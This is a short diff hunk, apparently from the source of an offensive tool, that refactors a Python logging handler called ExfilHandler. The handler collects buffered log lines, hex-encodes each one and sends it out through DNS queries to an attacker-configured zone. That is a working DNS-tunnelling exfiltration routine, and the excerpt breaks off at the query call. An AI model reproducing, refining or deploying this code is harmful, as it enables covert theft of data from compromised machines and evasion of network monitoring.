@@ -39,20 +39,18 @@ class ExfilHandler(logging.handlers.MemoryHandler):
         super(ExfilHandler, self).__init__(**kwargs)
 
     @property
-    def exfil_data(self):
-        buffered = self.target.stream.getvalue()
-        if not buffered:
-            return None
-        return [b for b in buffered.split('\n')[:-1]]
+    def can_exfil(self):
+        return True if self.target.stream.getvalue() else False
 
     def emit(self, record):
         self.buffer.append(record)
         if self.shouldFlush(record):
             self.flush()
             dns_zone = mal_cfg.get('rokkaku', 'dns_zone')
-            if self.exfil_data is None:
+            if not self.can_exfil:
                 return
-            for exfil in self.exfil_data:
+            exfil_data = self.target.stream.getvalue().splitlines()
+            for exfil in exfil_data:
                 payload = binascii.hexlify(bytes(exfil, 'utf8'))
                 try:
                     dns.resolver.query(
